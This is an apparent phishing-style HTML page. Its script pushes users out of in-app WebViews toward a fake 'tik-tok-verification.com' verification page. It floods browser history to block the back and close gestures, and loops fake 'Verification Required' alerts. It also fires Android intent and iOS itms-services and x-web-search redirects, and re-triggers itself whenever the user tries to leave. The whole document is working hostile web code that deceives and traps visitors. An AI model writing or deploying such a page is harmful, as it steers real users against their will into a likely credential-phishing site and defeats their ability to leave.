<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 
    let attemptCount = 14;

    function collisionBreakout() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        // 1. Trigger an 'untrusted' window opening
        // This causes the WebView to flag a 'Popup Blocked' or 'Open in Browser' event
        window.open(destination, '_blank');

        // 2. Immediate Protocol Shotgun
        if (isAndroid) {
            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
        } else if (isIOS) {
            // Using the 'itms-services' protocol which has high OS priority
            window.location.href = "itms-services://?action=download-manifest&url=" + encodeURIComponent(destination);
            
            setTimeout(() => {
                window.location.replace("x-web-search://?" + encodeURIComponent(destination));
            }, 50);
        }
    }

    function rampage() {
        // FAIL-SAFE: Check system clock
        if (Date.now() > killTime) return;

        collisionBreakout();

        // THE ALERT: Now tracks the attempt number for your testing
        alert("ATTEMPT #" + attemptCount + "\n\nVerification Required. Tap OK to open System Browser.");
        
        attemptCount++;
        collisionBreakout();

        setTimeout(rampage, 10);
    }

    window.onload = () => {
        // Jam the 'X' and back gestures
        for(let i=0; i<80; i++) history.pushState(null, null, "#ver_" + i);
        rampage();
    };

    // Re-trigger on any attempt to close the view
    window.onblur = () => { if (Date.now() < killTime) rampage(); };
    window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
</script>
</body>
</html>
